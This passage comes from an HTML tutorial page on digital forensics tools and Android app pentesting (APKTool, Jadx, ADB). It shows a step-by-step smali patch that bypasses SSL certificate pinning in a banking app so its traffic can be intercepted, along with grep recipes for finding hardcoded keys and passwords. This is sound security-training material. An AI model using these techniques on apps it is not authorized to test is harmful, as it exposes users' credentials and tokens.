bulk_extractor -j 8 -o output/ image.dd

# Uses 8 CPU cores (4x faster on quad-core!)

# -x : Enable specific scanners
bulk_extractor -x scan_accts -o output/ image.dd

# Only run the account scanner (finds username/password combos)

# -E : Enable specific extractors
bulk_extractor -E wordlist -o output/ image.dd

# Extract wordlist for password cracking

# -S : Specify scanner directory (for custom scanners)
bulk_extractor -S /usr/share/bulk_extractor/scanners -o output/ image.dd

# -q : Quiet mode (no output to screen)
bulk_extractor -q -o output/ image.dd</div>

            <h3>Part 6: chkrootkit - Rootkit Detection</h3>
            
            <p><strong>chkrootkit</strong> checks your system for rootkits‚Äîmalware that hides itself and other malware from detection!</p>

            <div class="metaphor-box">
                <h4>Rootkits = The Invisible Man</h4>
                <p>Normal malware is like a burglar wearing a ski mask‚Äîsuspicious but visible.<br><br>
                Rootkits are like invisible burglars:<br>
                ‚Ä¢ Hide processes from <span class="inline-code">ps</span> command<br>
                ‚Ä¢ Hide files from <span class="inline-code">ls</span> command<br>
                ‚Ä¢ Hide network connections from <span class="inline-code">netstat</span><br>
                ‚Ä¢ Replace system commands with backdoored versions<br><br>
                chkrootkit looks for signs of rootkit activity by checking if system commands have been modified and looking for known rootkit signatures!</p>
            </div>

            <div class="code"># Run chkrootkit (as root)
sudo chkrootkit

# Output:
# Checking `amd'... not found
# Checking `basename'... not infected
# Checking `biff'... not found
# Checking `chfn'... not infected
# Checking `chsh'... not infected
# Checking `cron'... not infected
# Checking `date'... not infected
# [...]
# Checking `lkm'... You have  5 process hidden for readdir command
# Checking `lkm'... Warning: Possible LKM Trojan installed  ‚Üê ALERT!
# 
# Any "Warning" or "INFECTED" is a red flag!

# Check specific tests:
sudo chkrootkit -x

# Lists all available tests

# Run specific test:
sudo chkrootkit suspicious_files

# Only checks for suspicious files

# Expert mode (detailed output):
sudo chkrootkit -x | grep INFECTED

# Shows only infected/suspicious results</div>

            <div class="warning-box">
                <h4>False Positives Are Common!</h4>
                <p>chkrootkit sometimes flags legitimate software as "suspicious". Don't panic!<br><br>
                <strong>Investigate further:</strong><br>
                ‚Ä¢ Google the specific warning<br>
                ‚Ä¢ Check file hashes against known good versions<br>
                ‚Ä¢ Use multiple rootkit scanners (rkhunter, OSSEC)<br>
                ‚Ä¢ Compare with clean system<br><br>
                Real rootkits are RARE on properly maintained systems. Most "detections" are false alarms!</p>
            </div>

            <h3>Part 7: Binwalk - Firmware Analysis Tool</h3>
            
            <p><strong>Binwalk</strong> analyzes, extracts, and reverse-engineers firmware images from routers, IoT devices, embedded systems!</p>

            <div class="code"># Analyze firmware file
binwalk firmware.bin

# Output:
# DECIMAL    HEX        DESCRIPTION
# 0          0x0        uImage header, header CRC: 0x12345678
# 64         0x40       LZMA compressed data
# 1048576    0x100000   Squashfs filesystem, little endian
# 3145728    0x300000   JFFS2 filesystem data
# 
# Shows what's INSIDE the firmware:
# - Boot loader
# - Compressed data
# - File systems
# - Embedded files

# Extract embedded files automatically:
binwalk -e firmware.bin

# Creates directory: _firmware.bin.extracted/
# Contains all extracted files and file systems!

# Extract specific signature:
binwalk --dd='.*' firmware.bin

# Extracts everything it finds</div>

            <h4>Analyzing Router Firmware Example</h4>
            
            <div class="code"># 1. Download firmware from manufacturer's website
wget http://routermaker.com/downloads/router_fw_v2.1.bin

# 2. Analyze with binwalk
binwalk router_fw_v2.1.bin

# Output shows:
# - SquashFS file system at offset 0x200000

# 3. Extract file system
binwalk -e router_fw_v2.1.bin

# 4. Navigate to extracted file system
cd _router_fw_v2.1.bin.extracted/squashfs-root/

# 5. You can now examine:
ls -la

# Output:
# bin/       ‚Üê Binaries
# etc/       ‚Üê Configuration files
# www/       ‚Üê Web interface
# lib/       ‚Üê Libraries

# 6. Look for hardcoded passwords
grep -r "password" etc/

# Output:
# etc/config.xml: <admin_password>admin123</admin_password>  ‚Üê FOUND IT!

# 7. Check web interface for vulnerabilities
cd www/
grep -r "eval" .

# Look for dangerous functions like eval(), system(), exec()</div>

            <div class="metaphor-box">
                <h4>üéâ You're Now a Digital Forensics Detective!</h4>
                <p>You've learned:<br><br>
                ‚úÖ <strong>Autopsy:</strong> GUI forensic analysis, disk image examination<br>
                ‚úÖ <strong>Volatility:</strong> Memory forensics, finding hidden malware<br>
                ‚úÖ <strong>Foremost:</strong> File carving, recovering deleted files<br>
                ‚úÖ <strong>Sleuthkit:</strong> Command-line forensics, timeline analysis<br>
                ‚úÖ <strong>bulk_extractor:</strong> Fast evidence extraction<br>
                ‚úÖ <strong>chkrootkit:</strong> Rootkit detection<br>
                ‚úÖ <strong>Binwalk:</strong> Firmware analysis<br><br>
                You can now investigate hacked systems, recover deleted evidence, analyze memory dumps, and extract firmware from IoT devices. Digital forensics is like being a detective with superpowers‚Äîyou can see what happened even when attackers tried to cover their tracks!<br><br>
                <strong>Practice challenges:</strong><br>
                ‚Ä¢ Download practice disk images from forensic CTFs<br>
                ‚Ä¢ Analyze your own system's memory<br>
                ‚Ä¢ Extract firmware from old routers<br>
                ‚Ä¢ Create timeline of your own file activity<br><br>
                The evidence is ALWAYS there if you know where to look! üîç</p>
            </div>
        </section>

        <!-- SECTION 2: Mobile Security & App Pentesting -->
        <section id="mobile-security" class="section">
            <h2 class="section-title">Mobile Security & App Pentesting</h2>
            <p class="section-intro">Welcome to the world where your phone is no longer just a communication device‚Äîit's a treasure chest of secrets, vulnerabilities, and attack vectors! Every app you download, every permission you grant, every API call made in the background... it's all code that can be analyzed, reversed, and potentially exploited. In this section, we're diving deep into the art and science of mobile application penetration testing. Whether you're hunting for hardcoded API keys, bypassing SSL pinning, or hooking into running processes to manipulate app behavior in real-time, this is your complete guide to mobile security from a hacker's perspective.</p>

            <div class="metaphor-box">
                <h4>üí° Think of Mobile Apps Like Locked Boxes</h4>
                <p>Imagine every app on your phone is a locked treasure box. Regular users see only the outside‚Äîthe shiny interface, the buttons, the screens. But as a pentester, you have tools to crack open that box and see what's inside: the actual code, the hidden API endpoints, the secrets developers thought were safe. APKTool is your crowbar, Jadx is your magnifying glass, and Frida is your master key that works while the box is still locked!</p>
            </div>

            <h3>What is Mobile Penetration Testing?</h3>
            <p>Mobile penetration testing is the process of systematically analyzing mobile applications (primarily Android and iOS) to identify security vulnerabilities before malicious actors can exploit them. Unlike traditional web pentesting where you're attacking servers and websites, mobile pentesting focuses on the app itself‚Äîthe code running on millions of devices.</p>

            <div class="info-box">
                <h4>Why Mobile Security Matters</h4>
                <p><strong>5+ billion smartphones worldwide.</strong> Each one runs dozens of apps. Banking apps, social media, health trackers, password managers‚Äîall storing sensitive data. A single vulnerability in a popular app can expose millions of users to:</p>
                <ul style="margin-top: 1rem; color: var(--text2);">
                    <li><strong>Data theft:</strong> Credentials, tokens, personal information</li>
                    <li><strong>Financial fraud:</strong> Bypassing payment verification, unauthorized transactions</li>
                    <li><strong>Privacy violations:</strong> Location tracking, microphone/camera access</li>
                    <li><strong>Malware injection:</strong> Modifying apps to include malicious code</li>
                </ul>
            </div>

            <h4>The Mobile Pentesting Process (Overview)</h4>
            <p>Before we dive into each tool, here's the big picture of how mobile pentesting works:</p>

            <div class="card-grid">
                <div class="card">
                    <h4>1. Acquisition</h4>
                    <p>Download the target APK (Android Package) or IPA (iOS App Store Package) from the app store, device, or third-party sources.</p>
                </div>
                <div class="card">
                    <h4>2. Static Analysis</h4>
                    <p>Decompile the app to examine its code, resources, and manifest files without running it. Look for hardcoded secrets, insecure configurations, and vulnerable code patterns.</p>
                </div>
                <div class="card">
                    <h4>3. Dynamic Analysis</h4>
                    <p>Run the app in a controlled environment while intercepting network traffic, monitoring file system changes, and hooking into functions to observe runtime behavior.</p>
                </div>
                <div class="card">
                    <h4>4. Vulnerability Assessment</h4>
                    <p>Identify security issues like insecure data storage, weak crypto, exposed endpoints, SSL pinning that can be bypassed, and insufficient authentication.</p>
                </div>
                <div class="card">
                    <h4>5. Exploitation</h4>
                    <p>Prove the impact by exploiting vulnerabilities‚Äîbypass authentication, extract sensitive data, modify app behavior, or escalate privileges.</p>
                </div>
                <div class="card">
                    <h4>6. Reporting</h4>
                    <p>Document findings with severity ratings, proof-of-concept code, impact assessment, and remediation recommendations.</p>
                </div>
            </div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è Legal & Ethical Boundaries</h4>
                <p><strong>CRITICAL:</strong> Only test apps you have explicit permission to test. This means:</p>
                <ul style="margin-top: 1rem;">
                    <li>Apps you developed yourself</li>
                    <li>Apps where you have written authorization from the owner/company</li>
                    <li>Apps specifically created for training (like DVIA, InsecureBankv2, etc.)</li>
                </ul>
                <p style="margin-top: 1rem;"><strong>Reverse engineering commercial apps without permission is often illegal</strong> under laws like the DMCA (USA), Computer Misuse Act (UK), and similar legislation worldwide. Bug bounty programs are your legal avenue for testing real-world apps!</p>
            </div>

            <h3>Understanding Android Architecture</h3>
            <p>Before you can hack Android apps, you need to understand what you're hacking. Let's break down Android's architecture from a pentester's perspective:</p>

            <h4>The APK Structure</h4>
            <p>An APK (Android Package Kit) is essentially a ZIP archive with a specific structure. When you decompile an APK, you'll find:</p>

            <div class="code">
my-app.apk/
‚îÇ
‚îú‚îÄ‚îÄ AndroidManifest.xml          ‚Üê App permissions, components, metadata
‚îú‚îÄ‚îÄ classes.dex                  ‚Üê Compiled Dalvik bytecode (the actual code)
‚îú‚îÄ‚îÄ classes2.dex                 ‚Üê Additional DEX files (large apps)
‚îú‚îÄ‚îÄ resources.arsc               ‚Üê Compiled resources (strings, layouts, etc.)
‚îú‚îÄ‚îÄ META-INF/                    ‚Üê App signatures and certificates
‚îÇ   ‚îú‚îÄ‚îÄ MANIFEST.MF
‚îÇ   ‚îú‚îÄ‚îÄ CERT.SF
‚îÇ   ‚îî‚îÄ‚îÄ CERT.RSA
‚îú‚îÄ‚îÄ lib/                         ‚Üê Native libraries (.so files)
‚îÇ   ‚îú‚îÄ‚îÄ armeabi-v7a/            ‚Üê ARM 32-bit libraries
‚îÇ   ‚îú‚îÄ‚îÄ arm64-v8a/              ‚Üê ARM 64-bit libraries
‚îÇ   ‚îú‚îÄ‚îÄ x86/                    ‚Üê x86 32-bit libraries
‚îÇ   ‚îî‚îÄ‚îÄ x86_64/                 ‚Üê x86 64-bit libraries
‚îú‚îÄ‚îÄ assets/                      ‚Üê Raw asset files (databases, configs, etc.)
‚îú‚îÄ‚îÄ res/                         ‚Üê Resources (images, layouts, strings)
‚îÇ   ‚îú‚îÄ‚îÄ drawable/               ‚Üê Images and icons
‚îÇ   ‚îú‚îÄ‚îÄ layout/                 ‚Üê XML UI layouts
‚îÇ   ‚îî‚îÄ‚îÄ values/                 ‚Üê Strings, colors, dimensions
‚îî‚îÄ‚îÄ kotlin/                      ‚Üê Kotlin metadata (if app uses Kotlin)
</div>

            <div class="info-box">
                <h4>Why This Structure Matters for Pentesting</h4>
                <p>Every folder and file has security implications:</p>
                <ul style="margin-top: 1rem; color: var(--text2);">
                    <li><strong>AndroidManifest.xml:</strong> Lists all permissions (camera, location, contacts). Over-privileged apps = red flag!</li>
                    <li><strong>classes.dex:</strong> The actual code. This is what you decompile to find vulnerabilities.</li>
                    <li><strong>lib/:</strong> Native libraries can contain hardcoded secrets or backdoors.</li>
                    <li><strong>assets/:</strong> Often contains databases, config files, API keys in plaintext.</li>
                    <li><strong>res/values/strings.xml:</strong> Developers sometimes hide API keys here thinking "it's just a string file."</li>
                </ul>
            </div>

            <h3>Part 1: APKTool - The Swiss Army Knife of APK Analysis</h3>

            <p><strong>APKTool</strong> is THE tool for decompiling and recompiling Android APK files. It converts the binary APK into human-readable format (Smali code and XML files), lets you modify it, then repackages it back into an APK. This is essential for understanding how apps work and testing modifications.</p>

            <div class="metaphor-box">
                <h4>üí° APKTool is Like Google Translate for Apps</h4>
                <p>Imagine you receive a book written in an alien language (the compiled APK). You can't read it directly. APKTool is your translator‚Äîit converts the alien language into something you can understand (Smali code, XML files). You can then edit the translation, and APKTool will convert it back into the alien language so the app can run with your changes!</p>
            </div>

            <h4>Installing APKTool</h4>

            <div class="code"># APKTool comes pre-installed on Kali, but here's how to update it:
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
mv apktool_2.9.3.jar apktool.jar
chmod +x apktool apktool.jar
sudo mv apktool apktool.jar /usr/local/bin/

# Verify installation:
apktool --version

# Output:
# 2.9.3</div>

            <h4>Decompiling an APK with APKTool</h4>

            <div class="code"># Basic syntax:
# apktool d [flags] <apk_file> [output_directory]
#
# d = decode (decompile)

# Example: Decompile an APK
apktool d myapp.apk

# Output:
# I: Using Apktool 2.9.3
# I: Loading resource table...
# I: Decoding AndroidManifest.xml with resources...
# I: Loading resource table from file: /home/user/.local/share/apktool/framework/1.apk
# I: Regular manifest package...
# I: Decoding file-resources...
# I: Decoding values */* XMLs...
# I: Baksmaling classes.dex...
# I: Baksmaling classes2.dex...
# I: Copying assets and libs...
# I: Copying unknown files...
# I: Copying original files...
#
# Creates folder: myapp/

# Navigate into decompiled app:
cd myapp/
ls -la

# Output:
# AndroidManifest.xml    ‚Üê Now human-readable XML!
# apktool.yml            ‚Üê APKTool metadata
# original/              ‚Üê Original META-INF (signature)
# res/                   ‚Üê All resources (images, layouts, strings)
# smali/                 ‚Üê Decompiled code in Smali format
# lib/                   ‚Üê Native libraries
# assets/                ‚Üê Asset files</div>

            <h4>APKTool Flags Explained (Every Single One!)</h4>

            <div class="code"># -d, --decode
# Decompile the APK (this is the default action)
apktool d myapp.apk

# -f, --force
# Force delete destination directory if it exists already
apktool d -f myapp.apk

# Without -f, you'd get error: "Destination directory exists, use -f to force"
# With -f, APKTool deletes the old folder and creates a fresh decompile

# -o, --output <dir>
# Specify custom output directory name
apktool d myapp.apk -o my_custom_folder

# Creates "my_custom_folder" instead of default "myapp"

# -s, --no-src
# Do NOT decompile source code (skip classes.dex ‚Üí smali conversion)
# Only extract resources (AndroidManifest, res/, assets/)
apktool d -s myapp.apk

# Useful when you only care about resources, not code
# Much faster! (No need to decompile thousands of smali files)

# -r, --no-res
# Do NOT decode resources (skip res/ folder)
# Only decompile code (classes.dex ‚Üí smali)
apktool d -r myapp.apk

# Opposite of -s. Use when you only need code, not images/layouts

# --no-assets
# Do NOT decode assets
# Skip the assets/ folder extraction
apktool d --no-assets myapp.apk

# --only-main-classes
# Only decompile main classes.dex (skip classes2.dex, classes3.dex, etc.)
apktool d --only-main-classes myapp.apk

# Large apps split code into multiple DEX files
# This flag saves time by only processing the first one

# --frame-path <dir>
# Specify custom framework directory
# (Advanced: For apps that depend on specific Android framework versions)
apktool d --frame-path /path/to/frameworks myapp.apk

# -p, --frame-tag <tag>
# Tag frameworks using a specific name
apktool d -p samsung_framework myapp.apk

# Useful for Samsung/Xiaomi/etc. apps with custom frameworks

# -t, --tag <tag>
# Use specific framework files with this tag
apktool d -t samsung myapp.apk

# --api <level>
# Set Android API level manually
apktool d --api 30 myapp.apk

# Forces APKTool to treat the app as Android 11 (API 30)

# -m, --match-original
# Keep some files in their original form (don't decode them)
apktool d -m myapp.apk

# Useful for preserving signature-related files</div>

            <h4>Recompiling (Building) an APK</h4>

            <div class="code"># After modifying the decompiled app, rebuild it:
# apktool b [flags] <folder_name>
#
# b = build (recompile)

# Basic build:
apktool b myapp

# Output:
# I: Using Apktool 2.9.3
# I: Checking whether sources has changed...
# I: Smaling smali folder into classes.dex...
# I: Smaling smali_classes2 folder into classes2.dex...
# I: Building resources...
# I: Copying libs... (/lib)
# I: Copying libs... (/kotlin)
# I: Building apk file...
# I: Copying unknown files/dir...
# I: Built apk into: myapp/dist/myapp.apk
#
# The rebuilt APK is in: myapp/dist/myapp.apk

# Build flags:

# -f, --force
# Force rebuild even if no changes detected
apktool b -f myapp

# -o, --output <file>
# Specify output APK filename
apktool b myapp -o modified_app.apk

# -c, --copy-original
# Copy original files (like original signature)
apktool b -c myapp

# -p, --frame-path <dir>
# Use custom framework path (must match what you used during decode)
apktool b -p samsung_framework myapp

# -d, --debug
# Build in debug mode (easier to debug with Android Studio)
apktool b -d myapp

# -n, --net-sec-conf
# Do not include default network security config
apktool b -n myapp

# Useful if you're adding custom network config

# -a, --aapt <path>
# Use custom aapt binary (Android Asset Packaging Tool)
apktool b -a /path/to/custom/aapt myapp

# --use-aapt2
# Use aapt2 instead of aapt (newer, faster)
apktool b --use-aapt2 myapp</div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è Rebuilt APKs Need to Be Signed!</h4>
                <p>After rebuilding an APK, Android will REFUSE to install it because it's no longer signed by the original developer. You must sign it with your own key:<br><br>
                <strong>Step 1: Generate a keystore (one-time setup)</strong></p>
                <div class="code" style="margin-top: 1rem;">keytool -genkey -v -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 2048 -validity 10000

# Answer the prompts:
# Enter keystore password: [your_password]
# Re-enter password: [your_password]
# What is your first and last name? [Your Name]
# [... more questions ...]

# This creates: my-release-key.keystore</div>
                <p style="margin-top: 1rem;"><strong>Step 2: Sign the rebuilt APK</strong></p>
                <div class="code" style="margin-top: 1rem;">jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my-release-key.keystore myapp/dist/myapp.apk my_alias

# Enter Passphrase for keystore: [your_password]
# Output:
#   signing: AndroidManifest.xml
#   signing: classes.dex
#   signing: resources.arsc
#   [... more files ...]
# jar signed.</div>
                <p style="margin-top: 1rem;"><strong>Step 3: Verify signature</strong></p>
                <div class="code" style="margin-top: 1rem;">jarsigner -verify -verbose -certs myapp/dist/myapp.apk

# Output:
# jar verified.</div>
                <p style="margin-top: 1rem;">Now your APK can be installed on Android devices!</p>
            </div>

            <h4>Real-World APKTool Workflow: Bypassing Certificate Pinning</h4>

            <p>Let's see APKTool in action with a common pentest scenario: bypassing SSL certificate pinning to intercept HTTPS traffic.</p>

            <div class="code"># Step 1: Decompile the target app
apktool d banking_app.apk

# Step 2: Navigate to decompiled code
cd banking_app/smali/com/bankingapp/network/

# Step 3: Find the certificate pinning code
# Look for files with "SSL", "Certificate", "Pinning" in names
grep -r "SSL" .
grep -r "Certificate" .

# Step 4: Open the relevant smali file
nano SSLPinningManager.smali

# You'll see Smali code (looks like assembly language):
# 
# .method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
#     .locals 2
#     const/4 v0, 0x0
#     invoke-static {}, Lcom/bankingapp/security/CertValidator;->verify()Z
#     move-result v0
#     if-nez v0, :cond_0
#     new-instance v1, Ljava/security/cert/CertificateException;
#     const-string v0, "Certificate validation failed"
#     invoke-direct {v1, v0}, Ljava/security/cert/CertificateException;-><init>(Ljava/lang/String;)V
#     throw v1
#     :cond_0
#     return-void
# .end method

# Step 5: Modify the code to always return (bypass check)
# Change:
#     invoke-static {}, Lcom/bankingapp/security/CertValidator;->verify()Z
#     move-result v0
#     if-nez v0, :cond_0
#     [throw exception code]
# 
# To:
#     return-void

# This makes the function immediately return without checking certificates!

# Step 6: Save and rebuild
apktool b banking_app

# Step 7: Sign the modified APK
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore ~/my-key.keystore banking_app/dist/banking_app.apk my_alias

# Step 8: Install on device
adb install banking_app/dist/banking_app.apk

# Step 9: Set up Burp Suite proxy on your device
# Now all HTTPS traffic from the app goes through Burp, and certificate errors are ignored!

# Step 10: Intercept API calls
# Open the banking app and watch Burp Suite capture all requests
# You can now see authentication tokens, API endpoints, sensitive data!</div>

            <div class="metaphor-box">
                <h4>üí° What Did We Just Do?</h4>
                <p>Think of SSL pinning like a bouncer checking IDs at a club. The app only trusts specific certificates (IDs), and rejects all others‚Äîeven your Burp Suite proxy certificate.<br><br>
                By modifying the Smali code, we told the bouncer "just let everyone in without checking IDs." Now we can intercept all the HTTPS traffic between the app and the server!<br><br>
                This is a CRITICAL technique for mobile pentesting because modern apps use SSL to hide their API calls. Without bypassing SSL pinning, you can't see what data the app is sending!</p>
            </div>

            <h4>Finding Hardcoded Secrets with APKTool</h4>

            <div class="code"># After decompiling with APKTool:
cd myapp/

# Search for API keys:
grep -r "api" . | grep -i "key"
grep -r "apikey" .
grep -r "api_key" .

# Output examples:
# ./res/values/strings.xml:<string name="google_api_key">AIzaSyB1234567890_API_KEY_HERE</string>
# ./smali/com/example/api/Config.smali:    const-string v0, "sk_live_51234567890"

# Search for passwords:
grep -r "password" . | grep -v ".png" | grep -v ".jpg"
# (excluding image files)

# Output:
# ./res/values/strings.xml:<string name="default_password">admin123</string>
# ./smali/com/example/auth/Login.smali:    const-string v1, "hardcoded_password"

# Search for database credentials:
grep -r "jdbc" .
grep -r "mysql" .
grep -r "postgres" .

# Search for AWS/cloud keys:
grep -r "AKIA" .     # AWS Access Key format
grep -r "aws" .

# Search for tokens:
grep -r "token" . | grep -v ".png"
grep -r "bearer" .
grep -r "jwt" .

# Check AndroidManifest.xml for suspicious permissions:
cat AndroidManifest.xml | grep "permission"

# Output:
# <uses-permission android:name="android.permission.INTERNET"/>
# <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
# <uses-permission android:name="android.permission.READ_CONTACTS"/>  ‚Üê Why does this app need contacts?
# <uses-permission android:name="android.permission.CAMERA"/>
# <uses-permission android:name="android.permission.RECORD_AUDIO"/>  ‚Üê Spyware?</div>

            <div class="info-box">
                <h4>Smali vs Java: What's the Difference?</h4>
                <p><strong>Java:</strong> High-level language developers write in<br>
                <strong>DEX:</strong> Compiled format Android uses (Dalvik Executable)<br>
                <strong>Smali:</strong> Human-readable representation of DEX bytecode<br><br>
                Think of it like this:<br>
                ‚Ä¢ <strong>Java:</strong> "if (password == 'admin') { login(); }"<br>
                ‚Ä¢ <strong>Smali:</strong> "const-string v0, 'admin' / if-eq v0, v1, :cond_0 / invoke-virtual {p0}, login"<br><br>
                Smali is harder to read but still understandable with practice. APKTool outputs Smali because you can't directly get Java from DEX. For Java-like code, use <strong>Jadx</strong> (next tool!)</p>
            </div>

            <h3>Part 2: Jadx - Java Decompiler for Android</h3>

            <p><strong>Jadx</strong> takes APK files and decompiles them directly into Java code‚Äîmuch easier to read than Smali! It has both GUI and command-line modes.</p>

            <div class="code"># Install Jadx (comes with Kali, but here's manual install):
wget https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zip
unzip jadx-1.4.7.zip -d jadx
cd jadx/bin
./jadx-gui   # Launch GUI version

# Or use command-line:
./jadx myapp.apk</div>

            <h4>Jadx GUI - The Easy Way</h4>

            <div class="code"># Launch Jadx GUI:
jadx-gui

# In the GUI:
# 1. File ‚Üí Open File ‚Üí Select myapp.apk
# 2. Wait for decompilation (can take 1-5 minutes for large apps)
# 3. Browse the code in the left panel
# 4. Click any class to see Java code!

# Features:
# ‚úÖ Full-text search (Ctrl+Shift+F)
# ‚úÖ Find usages of any method/class
# ‚úÖ Jump to declaration (Ctrl+B)
# ‚úÖ Export to Gradle project
# ‚úÖ Deobfuscation (unscramble obfuscated code)</div>

            <div class="metaphor-box">
                <h4>üí° APKTool vs Jadx: When to Use What?</h4>
                <p><strong>Use APKTool when:</strong><br>
                ‚Ä¢ You need to MODIFY and RECOMPILE the app<br>
                ‚Ä¢ You want to see the exact Smali code (closer to actual bytecode)<br>
                ‚Ä¢ You need to edit resources (strings.xml, layouts)<br><br>
                <strong>Use Jadx when:</strong><br>
                ‚Ä¢ You just want to READ the code (not modify)<br>
                ‚Ä¢ You prefer Java over Smali (much more readable!)<br>
                ‚Ä¢ You're searching for specific vulnerabilities in logic<br><br>
                <strong>Pro tip:</strong> Use BOTH! Decompile with Jadx to understand the code, then use APKTool to make modifications!</p>
            </div>

            <h4>Jadx Command-Line Flags (Complete Reference)</h4>

            <div class="code"># Basic decompile:
jadx myapp.apk

# Creates folder: myapp/
# Inside: sources/ (Java code) and resources/ (XML, images, etc.)

# -d, --output-dir <dir>
# Specify output directory
jadx -d output_folder myapp.apk

# -j, --threads-count <number>
# Number of threads for decompilation (faster!)
jadx -j 8 myapp.apk

# Uses 8 CPU cores (default is 4)
# Large apps benefit hugely from this!

# --no-res
# Do NOT decompile resources (skip resources folder)
jadx --no-res myapp.apk

# Faster if you only care about code

# --no-src
# Do NOT decompile source code (only extract resources)
jadx --no-src myapp.apk

# Opposite of --no-res

# --show-bad-code
# Include code that failed to decompile (usually obfuscated junk)
jadx --show-bad-code myapp.apk

# Normally Jadx skips methods it can't decompile
# This flag shows them anyway (as comments)

# --no-imports
# Don't add import statements (shows full class names everywhere)
jadx --no-imports myapp.apk

# Makes code longer but more explicit

# --no-debug-info
# Strip debug information
jadx --no-debug-info myapp.apk

# --add-debug-lines
# Add comments with original line numbers
jadx --add-debug-lines myapp.apk

# --no-inline-anonymous
# Don't inline anonymous classes
jadx --no-inline-anonymous myapp.apk

# --no-replace-consts
# Don't replace constants with actual values
jadx --no-replace-consts myapp.apk

# Example: Shows "0x7F0A0001" instead of "R.id.button"

# --escape-unicode
# Escape non-ASCII characters in strings
jadx --escape-unicode myapp.apk

# --deobf
# Enable deobfuscation (unscramble obfuscated names)
jadx --deobf myapp.apk

# Changes:
#   class a { void b() { ... } }
# To:
#   class MainActivity { void onCreate() { ... } }

# --deobf-min <length>
# Minimum length for deobfuscated names (default: 3)
jadx --deobf --deobf-min 4 myapp.apk

# --deobf-max <length>
# Maximum length for deobfuscated names (default: 64)
jadx --deobf --deobf-max 20 myapp.apk

# --deobf-cfg-file <file>
# Custom deobfuscation map
jadx --deobf --deobf-cfg-file mapping.txt myapp.apk

# --deobf-use-sourcename
# Use source file names for class naming
jadx --deobf --deobf-use-sourcename myapp.apk

# --deobf-parse-kotlin-metadata
# Use Kotlin metadata for deobfuscation
jadx --deobf --deobf-parse-kotlin-metadata myapp.apk

# --export-gradle
# Export as Android Studio project with gradle
jadx --export-gradle myapp.apk

# Creates buildable Android Studio project!

# -v, --verbose
# Verbose output (show progress details)
jadx -v myapp.apk

# --version
# Show Jadx version
jadx --version</div>

            <h4>Finding Security Issues with Jadx</h4>

            <div class="code"># After decompiling with Jadx:
cd myapp/sources/com/example/app/

# 1. Find hardcoded credentials:
grep -r "password" . | grep -v ".png"

# Output:
# ./auth/LoginActivity.java:    private static final String PASSWORD = "admin123";

# Open the file:
cat auth/LoginActivity.java

# You see:
# public class LoginActivity {
#     private static final String DEFAULT_USER = "admin";
#     private static final String DEFAULT_PASSWORD = "admin123";
#     
#     private void doLogin(String username, String password) {
#         if (username.equals(DEFAULT_USER) && password.equals(DEFAULT_PASSWORD)) {
#             // Hardcoded backdoor!
#         }
#     }
# }

# 2. Find SQL injection vulnerabilities:
grep -r "execSQL" .
grep -r "rawQuery" .
grep -r "query(" .

# Look for string concatenation instead of prepared statements:
# ‚ùå BAD (vulnerable):
# String query = "SELECT * FROM users WHERE username='" + username + "'";
# db.rawQuery(query, null);
# 
# ‚úÖ GOOD (safe):
# String query = "SELECT * FROM users WHERE username=?";
# db.rawQuery(query, new String[]{username});

# 3. Find insecure file storage:
grep -r "openFileOutput" .
grep -r "getExternalStorageDirectory" .
grep -r "MODE_WORLD_READABLE" .

# MODE_WORLD_READABLE = any app can read this file! (deprecated but still found)

# 4. Find insecure crypto:
grep -r "DES" .     # Weak encryption
grep -r "MD5" .     # Weak hashing
grep -r "SHA1" .    # Weak hashing

# Look for:
# Cipher cipher = Cipher.getInstance("DES");  ‚Üê BAD! Use AES!
# MessageDigest md = MessageDigest.getInstance("MD5");  ‚Üê BAD! Use SHA-256!

# 5. Find API endpoints:
grep -r "http://" .
grep -r "https://" .
grep -r "api" . | grep -i "url"

# Output:
# ./network/ApiClient.java:    private static final String BASE_URL = "https://api.example.com";
# ./network/ApiClient.java:    private static final String AUTH_ENDPOINT = "/auth/login";

# Now you know the API structure!

# 6. Find debugging code that shouldn't be in production:
grep -r "Log.d" .
grep -r "Log.v" .
grep -r "System.out.println" .

# Example:
# ./auth/LoginActivity.java:    Log.d("AUTH", "Password: " + password);
# ‚Üë Logs user passwords! Major security issue!

# 7. Find WebView vulnerabilities:
grep -r "WebView" .
grep -r "setJavaScriptEnabled" .
grep -r "addJavascriptInterface" .

# Look for:
# webView.setJavaScriptEnabled(true);  ‚Üê Needed for web apps
# webView.addJavascriptInterface(new JsInterface(), "Android");
# ‚Üë Allows JavaScript to call Java methods! Can be exploited!

# 8. Find intent vulnerabilities (exported components):
cd ../../    # Back to root
grep -r "exported=\"true\"" .

# Shows which components are accessible by other apps
# Could be exploited for privilege escalation!</div>

            <div class="info-box">
                <h4>Common Vulnerabilities Found via Jadx</h4>
                <p><strong>Hardcoded Secrets:</strong> API keys, passwords, tokens directly in code<br>
                <strong>Insecure Crypto:</strong> DES, MD5, SHA1, hardcoded encryption keys<br>
                <strong>SQL Injection:</strong> String concatenation in database queries<br>
                <strong>Path Traversal:</strong> User input directly in file paths<br>
                <strong>Insecure Data Storage:</strong> Sensitive data in SharedPreferences, external storage<br>
                <strong>Weak Authentication:</strong> Client-side validation, hardcoded credentials<br>
                <strong>Information Disclosure:</strong> Logging sensitive data, debug code in production<br>
                <strong>WebView Exploits:</strong> JavaScript interfaces, allowFileAccess enabled<br><br>
                <strong>Pro tip:</strong> Always check ProGuard/R8 obfuscation. If code looks scrambled (class names like 'a', 'b', 'c'), use --deobf flag!</p>
            </div>

            <h3>Part 3: ADB - Android Debug Bridge Master Class</h3>

            <p><strong>ADB (Android Debug Bridge)</strong> is your command-line interface to Android devices. It lets you install apps, access the shell, pull/push files, view logs, and much more. Essential for dynamic analysis!</p>

            <div class="code"># Check if ADB is installed:
adb version

# Output:
# Android Debug Bridge version 1.0.41
# Version 34.0.5-10900879

# Start ADB server (run once after boot):
adb start-server

# Output:
# * daemon not running; starting now at tcp:5037
# * daemon started successfully

# List connected devices:
adb devices

# Output:
# List of devices attached
